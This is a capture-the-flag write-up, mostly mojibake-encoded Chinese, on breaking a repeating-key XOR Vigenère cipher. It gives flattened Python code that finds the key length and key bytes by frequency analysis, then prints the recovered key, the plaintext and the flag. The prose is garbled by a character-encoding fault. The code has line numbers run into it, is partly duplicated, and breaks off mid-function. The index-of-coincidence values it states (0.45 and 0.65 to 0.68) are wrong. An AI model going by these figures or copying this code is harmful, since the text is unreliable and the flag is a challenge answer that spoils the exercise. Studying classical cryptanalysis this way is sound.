ç»„å¯†æ–‡ä¸­å„å­—æ¯çš„å‡ºç°é¢‘ç‡ï¼Œåœ¨å¯¹æ¯”è‡ªç„¶è‹±è¯­å­—æ¯çš„ä½¿ç”¨é¢‘ç‡ï¼Œç„¶åå°±èƒ½çŒœæµ‹æ¯ä¸€ä½å¯†æ–‡æ‰€å¯¹åº”çš„åŸæ–‡ã€‚æ ¹æ®ä¸€ç»„å¯†æ–‡æ‹¥æœ‰ç›¸åŒçš„åç§»é‡è¿™ä¸€ç‚¹ï¼Œå°±å¯çŒœæµ‹å‡ºæœ€ç»ˆçš„å¯†é’¥ã€‚ å› è€Œï¼Œè§£å¯†ç»´å‰å°¼äºšå¯†ç çš„ç¬¬ä¸€æ­¥åœ¨äºæ‰¾å‡ºå¯†é’¥çš„é•¿åº¦ã€‚åªè¦æ‰¾å‡ºäº†å¯†é’¥çš„é•¿åº¦ï¼Œå°±å¯ä»¥ç»Ÿè®¡å­—é¢‘çŒœæµ‹å…·ä½“å¯†é’¥ã€‚ æ€æ ·æ‰èƒ½æ±‚å‡ºå¯†é’¥çš„é•¿åº¦ï¼Ÿè¿™é‡Œå¼•å…¥ååˆ†é‡è¦çš„ä¸€ç‚¹ï¼Œä¹Ÿæ˜¯æ±‚è§£ç»´å‰å°¼äºšå¯†ç çš„å…³é”®ï¼Œå³é‡åˆæŒ‡æ•°ï¼ˆindex of coincidenceï¼‰ã€‚é‡åˆæŒ‡æ•°æ˜¯æŒ‡ï¼Œåœ¨ä¸€ä¸²å­—æ¯ä¸­ï¼Œä»»æ„å–å‡ºä¸¤ä¸ªå­—æ¯ï¼Œè¿™ä¸¤ä¸ªå­—æ¯ç›¸åŒçš„æ¦‚ç‡ã€‚ä¾‹å¦‚ï¼Œéšæœºç»™å‡ºä¸€ä¸²æ··ä¹±çš„å­—æ¯ï¼Œå®ƒçš„é‡åˆæŒ‡æ•°æ€»ä¼šåœ¨0.45é™„è¿‘ï¼Œè€Œä¸€ä¸²æœ‰æ„ä¹‰çš„è‹±è¯­æ®µè½ï¼Œå› ä¸ºå­—æ¯ä½¿ç”¨é¢‘ç‡çš„å½±å“ï¼Œé‡åˆæŒ‡æ•°æ€»æ˜¯ä¼šåœ¨0.65é™„è¿‘ï¼Œå¹¶ä¸”æ®µè½è¶Šé•¿è¶Šæ¥è¿‘è¿™ä¸¤ä¸ªå€¼ã€‚ æ˜“è§çš„æ˜¯ï¼Œç»™ä¸€ä¸²å­—æ¯ç›¸åŒçš„åç§»é‡ï¼Œå¹¶ä¸ä¼šæ”¹å˜è¿™ä¸²å­—æ¯çš„é‡åˆæŒ‡æ•°ã€‚å› æ­¤ï¼Œé€šè¿‡åŒä¸€ä½å¯†é’¥åŠ å¯†è€Œæˆçš„é‚£ä¸€ç»„ç»´å‰å°¼äºšå¯†æ–‡ï¼Œå› ä¸ºå®ƒæ˜¯æœ‰æ„ä¹‰çš„æ®µè½ï¼Œå®ƒçš„é‡åˆæŒ‡æ•°åº”è¯¥æ¥è¿‘äºè‡ªç„¶è‹±è¯­çš„é‡åˆæŒ‡æ•°0.68ã€‚æ ¹æ®è¿™ä¸€ç‚¹ï¼Œå°±å¯ä»¥çŒœæµ‹å¯†é’¥çš„é•¿åº¦ï¼Œå†è®¡ç®—å„ä¸ªé•¿åº¦ä¸‹å¯†é’¥çš„é‡åˆæŒ‡æ•°ï¼ˆæ¯ä¸ªé•¿åº¦ä¸‹çš„å‡ ç»„å¯ä»¥å–å‡å€¼ï¼‰ï¼Œç»“æœæœ€æ¥è¿‘0.68çš„é‚£ä¸ªç»“æœï¼Œå°±å¯ä»¥å¤§èƒ†çŒœæµ‹æ˜¯å¯†é’¥çš„é•¿åº¦ã€‚ æ±‚å‡ºäº†å¯†é’¥çš„é•¿åº¦ï¼Œå°±å¯ä»¥å¦‚ä¸Šè¿°é‚£æ ·é€šè¿‡å­—é¢‘ç»Ÿè®¡æ±‚å‡ºæ¯ä¸€ä½å¯†é’¥è¿›è€Œè§£å¯†å‡ºåŸæ–‡äº†ã€‚ æœ¬é¢˜è§£æ³•çŸ¥é“äº†ä¼ ç»Ÿç»´å‰å°¼äºšå¯†ç çš„è§£æ³•ï¼Œå†çœ‹æœ¬é¢˜ï¼Œä¹Ÿå°±ä¸éš¾äº†ã€‚è™½ç„¶æœ¬é¢˜æœ€ç»ˆé‡‡ç”¨äº†å¼‚æˆ–çš„æ–¹å¼æ¥åŠ å¯†åŸæ–‡ï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿç»´å‰å°¼äºšå¯†ç çš„åç§»ï¼Œä½†æœ€ç»ˆï¼Œåªè¦èƒ½å¤Ÿæ±‚å‡ºå¯†é’¥çš„é•¿åº¦ï¼Œéƒ½å¯ä»¥ä½¿ç”¨å­—é¢‘åˆ†æçš„æ–¹æ³•æ¥è®¡ç®—å‡ºå¯†é’¥æ¥è§£å¯†ã€‚ æ‰€ä»¥è¯´ï¼Œæ±‚è§£æœ¬é¢˜ï¼Œä¸»è¦ä¹Ÿæ˜¯é¦–å…ˆç¡®å®šå¯†é’¥é•¿åº¦ã€‚ è¿™é‡Œç¬¬ä¸€ä¸ªæ€è·¯å°±å¯ä»¥åƒä»¥ä¸Šæ±‚ä¼ ç»Ÿç»´å‰å°¼äºšå¯†ç é‚£æ ·é€šè¿‡è®¡ç®—é‡åˆæŒ‡æ•°æ¥ç¡®å®šã€‚ç„¶è€Œæœ‰ä¸€ç‚¹ä¸å¯å¿½è§†çš„æ˜¯ï¼Œé‡åˆæŒ‡æ•°æ³•åªé€‚åˆäºç»™å‡ºçš„å¯†æ–‡å…¨éƒ¨ç”±å­—æ¯åŠ å¯†è€Œæˆçš„æƒ…å†µã€‚ä¼ ç»Ÿç»´å‰å°¼äºšå¯†ç åªèƒ½åŠ å¯†å­—æ¯ï¼ˆåç§»ï¼‰ï¼Œè¿™é“é¢˜åˆ™é€šè¿‡å¼‚æˆ–çš„æ–¹æ³•æ¥åŠ å¯†ï¼Œä½¿å¾—ä»»æ„å­—ç¬¦éƒ½å¯ä»¥ç”Ÿæˆå¯¹åº”çš„å¯†æ–‡ã€‚å› æ­¤ï¼Œç”±äºå…¶å®ƒéå­—æ¯å­—ç¬¦çš„å¹²æ‰°ï¼Œå°±æ— æ³•æ±‚å‡ºå‡†ç¡®çš„é‡åˆæŒ‡æ•°ï¼Œä¹Ÿå°±éš¾ä»¥é€šè¿‡é‡åˆæŒ‡æ•°æ³•å¯»æ‰¾å‡ºå¯†é’¥é•¿åº¦ã€‚ æ³¨æ„åˆ°ï¼Œæœ¬é¢˜ä½¿ç”¨çš„æ˜¯å¼‚æˆ–å½¢å¼æ¥åŠ å¯†ã€‚æ˜¯å¦è¿˜è®°å¾—å¼‚æˆ–æœ‰å‡ ä¸ªç‹¬ç‰¹æ€§è´¨ï¼š 1234a^a = 0 //ä¸€ä¸ªæ•°å¼‚æˆ–æœ¬èº«ç­‰äºé›¶a^0 = a //ä¸€ä¸ªæ•°å¼‚æˆ–é›¶ç­‰äºæœ¬èº«(a^b)^c = a^(b^c) //å¼‚æˆ–æ»¡è¶³ç»“åˆå¾‹a^b^b = a //å› æ­¤ï¼Œä¸€ä¸ªæ•°ä¸¤æ¬¡å¼‚æˆ–åŒä¸€ä¸ªæ•°ç­‰äºæœ¬èº« æœ¬é¢˜çš„å¯†æ–‡æ˜¯ç”±æ˜æ–‡ä¸å¯†é’¥å¼‚æˆ–è€Œæ¥çš„ï¼Œå› æ­¤ æ˜æ–‡^å¯†é’¥ = å¯†æ–‡ï¼Œä¹Ÿå°±æ˜¯æ˜æ–‡ = å¯†æ–‡^å¯†é’¥ã€‚å…³é”®ç‚¹æ˜¯ï¼Œæ˜æ–‡ä¸€å®šæ˜¯ç”±asciiå­—ç¬¦ç»„æˆçš„ï¼Œå¹¶ä¸”å¯†é’¥ä¸€å®šå­˜åœ¨ã€‚å¦‚æœå‡å®šå‡ºå¯†é’¥çš„é•¿åº¦ï¼Œé‚£ä¹ˆå¯ä»¥å°†å¯†æ–‡åˆ’åˆ†æˆç›¸åº”çš„å‡ ç»„ï¼Œå¯†é’¥çš„å–å€¼èŒƒå›´åˆåœ¨ä¸€å®šçš„èŒƒå›´ä¹‹å†…ï¼ˆunsigned char ï¼Œ0~255ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœåœ¨å‡å®šçš„é•¿åº¦ä¸‹ï¼ŒæŸä¸€ç»„å¯†æ–‡åœ¨è¿™ä¸ªèŒƒå›´å†…æ‰¾ä¸åˆ°åˆç†çš„å¯†é’¥ï¼ˆä½¿å¾—ä¸å¯†æ–‡å¼‚æˆ–ä¸ºasciiå­—ç¬¦çš„å¯†é’¥ï¼‰ï¼Œé‚£å°±è¯´æ˜å¯†é’¥ä¸å¯èƒ½æ˜¯è¿™ä¸ªé•¿åº¦ã€‚ é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå°±å¯ä»¥æ±‚å¾—å¯†é’¥å¯èƒ½çš„é•¿åº¦èŒƒå›´çš„å–å€¼ï¼Œå¹¶ä¸”è¿˜å¯ä»¥æ±‚å‡ºè¿™ä¸ªé•¿åº¦ä¸‹ï¼Œå„ç»„å¯†æ–‡å¯¹åº”å¯†é’¥çš„å¯èƒ½å€¼ï¼ˆä½¿å¾—è¿™ç»„å¯†æ–‡å…¨éƒ¨èƒ½æ±‚å¾—asciièŒƒå›´å†…çš„æ˜æ–‡çš„æ‰€æœ‰å¯èƒ½å–å€¼ï¼‰ã€‚ æ±‚å‡ºäº†å¯†é’¥çš„é•¿åº¦ï¼Œä»¥åŠæ¯ä¸€ä½å¯†é’¥çš„å¯èƒ½å–å€¼ï¼Œå†æµ‹è¯•å‡ºæ¯ä¸€ä½å¯†é’¥å¯èƒ½å–å€¼è§£å‡ºåŸæ–‡å¯¹åº”çš„å­—é¢‘ï¼Œå–å…¶ä¸­æœ€ç¬¦åˆè‡ªç„¶è‹±è¯­çš„é‚£ä¸€ä¸ªï¼Œå°±å¯ä»¥çŒœæµ‹è¿™æ˜¯æœ€ç»ˆçš„å¯†é’¥äº†ã€‚ å…·ä½“å®ç°é¦–å…ˆï¼Œæ±‚å‡º1~14èŒƒå›´å†…å¯†é’¥çš„å–å€¼ï¼Œå¦‚æœæœ‰ç©ºé›†å°±è¯æ˜ä¸èƒ½ä¸ºè¿™ä¸ªé•¿åº¦ï¼š 1234567891011def controlFlow(): keyLengthRange = range(1,15) cipher = readCipher(&#x27;c.txt&#x27;) for i in keyLengthRange: keyGroup = getKeyRange(i, cipher) for a in keyGroup: if 0 == len(a): break; #å¯†é’¥æ¯ä¸€ä½ä¸€å®šæœ‰å€¼ else: #æ²¡æœ‰ç©ºé›†å°±é€šè¿‡å­—é¢‘æ±‚å…·ä½“å€¼ ...... #çœç•¥çš„ä»£ç  å…¶ä¸­ï¼ŒgetKeyRangeæ±‚å‡ºæ¯ä¸€ä½å¯†é’¥çš„å¯èƒ½å€¼ï¼š 1234567891011121314151617181920def getKeyRange(keyLength, cipher): &#x27;&#x27;&#x27; æµ‹è¯•æ¯ä¸€ä½å¯†é’¥å¯èƒ½çš„å–å€¼ï¼Œè‹¥ç”ŸæˆèŒƒå›´ä¹‹å¤–çš„æ˜æ–‡ï¼Œå°±æŠ›å¼ƒè¿™ä¸ªå€¼ å¦åˆ™ï¼Œå°±å°†è¿™ä¸ªå€¼åŠ å…¥ç»“æœé›†ä¹‹ä¸­ &#x27;&#x27;&#x27; cipherGroup = getCipherGroup(keyLength, cipher) keyGroup = [[] for a in range(keyLength)] count=0 for perCipherGroup in cipherGroup: for keyTest in range(1,255): for perCipher in perCipherGroup: plainChar = perCipher^keyTest if plainChar not in range(32,127): break else: keyGroup[count].append(keyTest) count+=1 #ä¸‹ä¸€ç»„å¯†æ–‡ return keyGroup æ±‚å‡ºå¯†é’¥èŒƒå›´ï¼Œå°±é€šè¿‡å­—é¢‘ç»Ÿè®¡æ±‚å‡ºå…·ä½“å€¼ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344def getLetterFrequency(key, perCipher):&#x27;&#x27;&#x27;æ±‚å‡ºç»¼åˆå­—é¢‘&#x27;&#x27;&#x27; frequencies = &#123;&quot;e&quot;: 0.12702, &quot;t&quot;: 0.09056, &quot;a&quot;: 0.08167, &quot;o&quot;: 0.07507, &quot;i&quot;: 0.06966, &quot;n&quot;: 0.06749, &quot;s&quot;: 0.06327, &quot;h&quot;: 0.06094, &quot;r&quot;: 0.05987, &quot;d&quot;: 0.04253, &quot;l&quot;: 0.04025, &quot;c&quot;: 0.02782, &quot;u&quot;: 0.02758, &quot;m&quot;: 0.02406, &quot;w&quot;: 0.02360, &quot;f&quot;: 0.02228, &quot;g&quot;: 0.02015, &quot;y&quot;: 0.01974, &quot;p&quot;: 0.01929, &quot;b&quot;: 0.01492, &quot;v&quot;: 0.00978, &quot;k&quot;: 0.00772, &quot;j&quot;: 0.00153, &quot;x&quot;: 0.00150, &quot;q&quot;: 0.00095, &quot;z&quot;: 0.00074&#125; #å„ä¸ªå­—æ¯çš„å‡ºç°é¢‘ç‡ count=&#123;&#125; for ch in perCipher: plainChar = key^ch if plainChar in range(65,91) or plainChar in range(97,123): #è¦æ’é™¤éå­—æ¯å­—ç¬¦ char = chr(plainChar).lower() count[char] = count.setdefault(char, 0)+1 #è¿™ä¸ªå­—æ¯å‡ºç°çš„æ¬¡æ•° freq = 0.0 for a in count: freq += frequencies[a]*count[a]/len(perCipher) #é™¤ä»¥å¯†æ–‡é•¿åº¦ï¼Œä»¥å°½å¯èƒ½å‡å°éå­—æ¯å­—ç¬¦å¯¹å­—é¢‘çš„å½±å“ return freqdef getKeyConfirmValue(keyGroup,cipher): &#x27;&#x27;&#x27; è®¡ç®—å‡å®šæŸä¸€ä½ä¸Šçš„å¯†é’¥æ˜¯æ­£ç¡®çš„æƒ…å†µä¸‹ï¼Œç”¨è¿™ä¸ªå¯†é’¥è§£å¯†å¯†æ–‡æ‰€å‡ºæ¥çš„æ˜æ–‡æ®µè½ä¸­å­—æ¯çš„ç»¼åˆä½¿ç”¨é¢‘ç‡ï¼Œæ­£ç¡®çš„å¯†é’¥è¿™ä¸ªé¢‘ç‡åº”è¯¥å°½å¯èƒ½é«˜ &#x27;&#x27;&#x27; cipherGroup = getCipherGroup(len(keyGroup), cipher) key = [] count=0 for perKey in keyGroup: maxFreq = 0 tempKey = 0 for a in perKey: freq = getLetterFrequency(a, cipherGroup[count]) if freq&gt;maxFreq: #æ­£ç¡®çš„å¯†é’¥ï¼Œç®—å‡ºæ¥çš„ç»¼åˆå­—é¢‘åº”è¯¥å°½å¯èƒ½å¤§ maxFreq = freq tempKey = a key.append(tempKey) count += 1 return key æœ€åè§£å¯†å‡ºåŸæ–‡ï¼š 1234567def cipherDecrypt(key, cipher): plainText = &#x27;&#x27; index = 0 for a in cipher: plainText += chr(key[index%len(key)]^a) index += 1 return plainText æœ€ç»ˆå¾—å‡ºçš„ç»“æœä¸ºï¼š A possible key is: [186, 31, 145, 178, 83, 205, 62]A possible plainText is: Cryptography is the practice and study of techniques for, among other things, secure communication in the presence of attackers. Cryptography has been used for hundreds, if not thousands, of years, but traditional cryptosystems were designed and evaluated in a fairly ad hoc manner. For example, the Vigenere encryption scheme was thought to be secure for decades after it was invented, but we now know, and this exercise demonstrates, that it can be broken very easily. é¢˜ç›®ä¸­è¯´falgæ˜¯åŸæ–‡æœ€åå…­ä¸ªå­—æ¯ï¼Œæ²¡æœ‰æ ‡ç‚¹ï¼Œå› æ­¤æœ€ç»ˆå¾—åˆ°çš„falgä¸ºï¼š nctf{it can be broken very easily} å¯¹æˆ‘ä¸€ç‚¹ä¹Ÿä¸ç®€å•å°±æ˜¯äº†â€¦ å‚è€ƒhttps://findneo.github.io/2017/10/nupt-vigenere/http://blog.csdn.net/qq_31344951/article/details/77934717 https://zh.wikipedia.org/wiki/ç»´å‰å°¼äºšå¯†ç  https://www.zhihu.com/question/29515338 http://blog.csdn.net/limisky/article/details/16885959 å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899def readCipher(filename): file = open(filename, &#x27;r&#x27;) strCipher = file.read() cipher = [] index = 0 while index &lt; len(strCipher): cipher.append(int(strCipher[index:index+2], 16)) index += 2 return cipherdef getCipherGroup(keyLength, cipher): cipherGroup = [[] for a in range(keyLength)] count = 0 while count &lt; len(cipher): cipherGroup[(count) % keyLength] += [cipher[count]] count += 1 return cipherGroupdef getKeyRange(keyLength, cipher): cipherGroup = getCipherGroup(keyLength, cipher) keyGroup = [[] for a in range(keyLength)] count=0 for perCipherGroup in cipherGroup: for keyTest in range(1,255): for perCipher in perCipherGroup: plainChar = perCipher^keyTest if plainChar not in range(32,127): break else: keyGroup[count].append(keyTest) count+=1 return keyGroupdef getLetterFrequency(key, perCipher): frequencies = &#123;&quot;e&quot;: 0.12702, &quot;t&quot;: 0.09056, &quot;a&quot;: 0.08167, &quot;o&quot;: 0.07507, &quot;i&quot;: 0.06966, &quot;n&quot;: 0.06749, &quot;s&quot;: 0.06327, &quot;h&quot;: 0.06094, &quot;r&quot;: 0.05987, &quot;d&quot;: 0.04253, &quot;l&quot;: 0.04025, &quot;c&quot;: 0.02782, &quot;u&quot;: 0.02758, &quot;m&quot;: 0.02406, &quot;w&quot;: 0.02360, &quot;f&quot;: 0.02228, &quot;g&quot;: 0.02015, &quot;y&quot;: 0.01974, &quot;p&quot;: 0.01929, &quot;b&quot;: 0.01492, &quot;v&quot;: 0.00978, &quot;k&quot;: 0.00772, &quot;j&quot;: 0.00153, &quot;x&quot;: 0.00150, &quot;q&quot;: 0.00095, &quot;z&quot;: 0.00074&#125; count=&#123;&#125; for ch in perCipher: plainChar = key^ch if plainChar in range(65,91) or plainChar in range(97,123): char = chr(plainChar).lower() count[char] = count.setdefault(char, 0)+1 freq = 0.0 for a in count: freq += frequencies[a]*count[a]/len(perCipher) return freqdef getKeyConfirmValue(keyGroup,cipher): cipherGroup = getCipherGroup(len(keyGroup), cipher) key = [] count=0 for perKey in keyGroup: maxFreq = 0 tempKey = 0 for a in perKey: freq = getLetterFrequency(a, cipherGroup[count]) if freq&gt;maxFreq: maxFreq = freq tempKey = a key.append(tempKey) count += 1 return keydef cipherDecrypt(key, cipher): plainText = &#x27;&#x27; index = 0 for a in cipher: plainText += chr(key[index%len(key)]^a) index += 1 return plainTextdef controlFlow(): keyLengthRange = range(1,15) cipher = readCipher(&#x27;c.txt&#x27;) for i in keyLengthRange: keyGroup = getKeyRange(i, cipher) for a in keyGroup: if 0 == len(a): break; else: #print(&#x27;A possible key group is:&#x27;, keyGroup,&#x27;\\\\n&#x27;) key = getKeyConfirmValue(keyGroup, cipher) print(&#x27;A possible key is:&#x27;, key,&#x27;\\\\n&#x27;) plainText = cipherDecrypt(key, cipher) print(&#x27;A possible plainText is:&#x27;, plainText,&#x27;\\\\n&#x27;)if __name__==&#x27;__main__&#x27;: controlFlow() å¦ä¸€ä¸ªå¯ç”¨ç‰ˆæœ¬çš„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475def findindexkey(subarr):#è¯¥å‡½æ•°å¯ä»¥æ‰¾å‡ºå°†å¯†æ–‡subarrè§£å¯†æˆå¯è§å­—ç¬¦çš„æ‰€æœ‰å¯èƒ½å€¼ visiable_chars=[]#å¯è§å­—ç¬¦ for x in range(32,126): visiable_chars.append(chr(x)) #print(vi) test_keys=[]#ç”¨äºæµ‹è¯•å¯†é’¥ ans_keys=[]#ç”¨äºç»“æœçš„è¿”å› for x in range(0x00,0xFF):# æšä¸¾å¯†é’¥é‡Œæ‰€æœ‰çš„å€¼ test_keys.append(x) ans_keys.append(x) for i in test_keys:#å¯¹äº0x00~0xFFé‡Œçš„æ¯ä¸€ä¸ªæ•°iå’Œsubarré‡Œçš„æ¯ä¸ªå€¼så¼‚æˆ– for s in subarr: if chr(s^i) not in visiable_chars:#ç”¨iè§£å¯†sï¼Œå¦‚æœè§£å¯†åæ˜æ–‡ä¸æ˜¯å¯è§å­—ç¬¦ï¼Œè¯´æ˜iä¸æ˜¯å¯†é’¥ ans_keys.remove(i)#å»æ‰ans_keysé‡Œæµ‹è¯•å¤±è´¥çš„å¯†é’¥ break #print(ans_keys) return ans_keys strmi=&#x27;F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923C\\\\AB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF\\\\5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84C\\\\C931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D96\\\\3FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47E\\\\FD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5\\\\923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA\\\\36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63C\\\\ED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A8\\\\5A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250\\\\C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794&#x27;arr=[]#å¯†æ–‡ï¼Œæ¯ä¸ªå…ƒç´ ä¸ºå­—ç¬¦çš„asciiç for x in range(0,len(strmi),2): arr.append(int(strmi[x:2+x],16)) for keylen in range(1,14):#æšä¸¾å¯†é’¥çš„é•¿åº¦1~14 for index in range(0,keylen):#å¯¹å¯†é’¥é‡Œçš„ç¬¬indexä¸ªè¿›è¡Œæµ‹è¯• subarr=arr[index::keylen]#æ¯éš”keylené•¿åº¦æå–å¯†æ–‡çš„å†…å®¹ï¼Œæå–å‡ºæ¥çš„å†…å®¹éƒ½è¢«å¯†æ–‡çš„ç¬¬indexä¸ªåŠ å¯† ans_keys=findindexkey(subarr)#æ‰¾å‡ºå¯†é’¥ä¸­ç¬¬indexä¸ªçš„å¯èƒ½çš„å€¼ print(&#x27;keylen=&#x27;,keylen,&#x27;index=&#x27;,index,&#x27;keys=&#x27;,ans_keys) if ans_keys:#å¦‚æœå¯†é’¥ç¬¬indexä¸ªæœ‰å¯èƒ½å­˜åœ¨ï¼Œå°è¯•ç”¨å¯†é’¥çš„indexä¸ªå»è§£å¯†æ–‡ ch=[] for x in ans_keys: ch.append(chr(x^subarr[0])) print(ch)#è¿è¡Œåˆ°è¿™é‡Œï¼Œè§‚å¯Ÿè¾“å‡ºå¯ä»¥å‘ç°ï¼Œå¯†é’¥é•¿åº¦ä¸º7æ—¶æœ‰è§£print(&#x27;###############&#x27;)import stringdef findindexkey2(subarr):#å†é€ ä¸€ä¸ªå‡½æ•°ç­›é€‰å¯†é’¥ test_chars=string.ascii_letters+string.digits+&#x27;,&#x27;+&#x27;.&#x27;+&#x27; &#x27;#å°†æ£€æŸ¥çš„å­—ç¬¦æ”¹ä¸ºè‹±æ–‡+æ•°å­—+é€—å·+å¥å·+ç©ºæ ¼ #print(test_chars) test_keys=[]#ç”¨äºæµ‹è¯•å¯†é’¥ ans_keys=[]#ç”¨äºç»“æœçš„è¿”å› for x in range(0x00,0xFF):# æšä¸¾å¯†é’¥é‡Œæ‰€æœ‰çš„å€¼ test_keys.append(x) ans_keys.append(x) for i in test_keys:#å¯¹äº0x00~0xFFé‡Œçš„æ¯ä¸€ä¸ªæ•°iå’Œsubstré‡Œçš„æ¯ä¸ªå€¼så¼‚æˆ– for s in subarr: if chr(s^i) not in test_chars:#ç”¨iè§£å¯†sï¼Œå¦‚æœè§£å¯†åä¸æ˜¯è‹±æ–‡ã€æ•°å­—ã€é€—å·ã€å¥å·ã€ç©ºæ ¼ï¼Œè¯´æ˜iä¸æ˜¯å¯†é’¥ ans_keys.remove(i)#å»æ‰ans_keysé‡Œæµ‹è¯•å¤±è´¥çš„å¯†é’¥ break #print(ans_keys) return ans_keys vigenerekeys=[]#ç»´åŸºå°¼å°”å¯†ç çš„å¯†é’¥for index in range(0,7):#å·²ç»çŸ¥é“å¯†é’¥é•¿åº¦æ˜¯7 subarr=arr[index::7] vigenerekeys.append(findindexkey2(subarr))print(vigenerekeys)#è¾“å‡ºçš„æ˜¯[[186], [31], [145], [178], [83], [205], [62]]. print(&quot;#########&quot;)ming=&#x27;&#x27;for i in range(0,len(arr)): ming=ming+chr(arr[i]^vigenerekeys[i%7][0])print(ming) vigenere.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475def findindexkey(subarr):#è¯¥å‡½æ•°å¯ä»¥æ‰¾å‡ºå°†å¯†æ–‡subarrè§£å¯†æˆå¯è§å­—ç¬¦çš„æ‰€æœ‰å¯èƒ½å€¼ visiable_chars=[]#å¯è§å­—ç¬¦ for x in range(32,126): visiable_chars.append(chr(x)) #print(vi) test_keys=[]#ç”¨äºæµ‹è¯•å¯†é’¥ ans_keys=[]#ç”¨äºç»“æœçš„è¿”å› for x in range(0x00,0xFF):# æšä¸¾å¯†é’¥é‡Œæ‰€æœ‰çš„å€¼ test_keys.append(x) ans_keys.append(x) for i in test_keys:#å¯¹äº0x00~0xFFé‡Œçš„æ¯ä¸€ä¸ªæ•°iå’Œsubarré‡Œçš„æ¯ä¸ªå€¼så¼‚æˆ– for s in subarr: if chr(s^i) not in visiable_chars:#ç”¨iè§£å¯†sï¼Œå¦‚æœè§£å¯†åæ˜æ–‡ä¸æ˜¯å¯è§å­—ç¬¦ï¼Œè¯´æ˜iä¸æ˜¯å¯†é’¥ ans_keys.remove(i)#å»æ‰ans_keysé‡Œæµ‹è¯•å¤±è´¥çš„å¯†é’¥ break #print(ans_keys) return ans_keys strmi=&#x27;F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923C\\AB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF\\5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84C\\C931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D96\\3FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47E\\FD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5\\923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA\\36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63C\\ED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A8\\5A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250\\C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794&#x27;arr=[]#å¯†æ–‡ï¼Œæ¯ä¸ªå…ƒç´ ä¸ºå­—ç¬¦çš„asciiç for x in range(0,len(strmi),2): arr.append(int(strmi[x:2+x],16)) for keylen in range(1,14):#æšä¸¾å¯†é’¥çš„é•¿åº¦1~14 for index in range(0,keylen):#å¯¹å¯†é’¥é‡Œçš„ç¬¬indexä¸ªè¿›è¡Œæµ‹è¯• subarr=arr[index::keylen]#æ¯éš”keylené•¿åº¦æå–å¯†æ–‡çš„å†…å®¹ï¼Œæå–å‡ºæ¥çš„å†…å®¹éƒ½è¢«å¯†æ–‡çš„ç¬¬indexä¸ªåŠ å¯† ans_keys=findindexkey(subarr)#æ‰¾å‡ºå¯†é’¥ä¸­ç¬¬indexä¸ªçš„å¯èƒ½çš„å€¼ print(&#x27;keylen=&#x27;,keylen,&#x27;index=&#x27;,index,&#x27;keys=&#x27;,ans_keys) if ans_keys:#å¦‚æœå¯†é’¥ç¬¬indexä¸ªæœ‰å¯èƒ½å­˜åœ¨ï¼Œå°è¯•ç”¨å¯†é’¥çš„indexä¸ªå»è§£å¯†æ–‡ ch=[] for x in ans_keys: ch.append(chr(x^subarr[0])) print(ch)#è¿è¡Œåˆ°è¿™é‡Œï¼Œè§‚å¯Ÿè¾“å‡ºå¯ä»¥å‘ç°ï¼Œå¯†é’¥é•¿åº¦ä¸º7æ—¶æœ‰è§£print(&#x27;###############&#x27;)import stringdef findindexkey2(subarr):#å†é€ ä¸€ä¸ªå‡½æ•°ç­›é€‰å¯†é’¥ test_chars=string.ascii_letters+string.digits+&#x27;,&#x27;+&#x27;.&#x27;+&#x27; &#x27;#å°†æ£€æŸ¥çš„å­—ç¬¦æ”¹ä¸ºè‹±æ–‡+æ•°å­—+é€—å·+å¥å·+ç©ºæ ¼ #print(test_chars) test_keys=[]#ç”¨äºæµ‹è¯•å¯†é’¥ 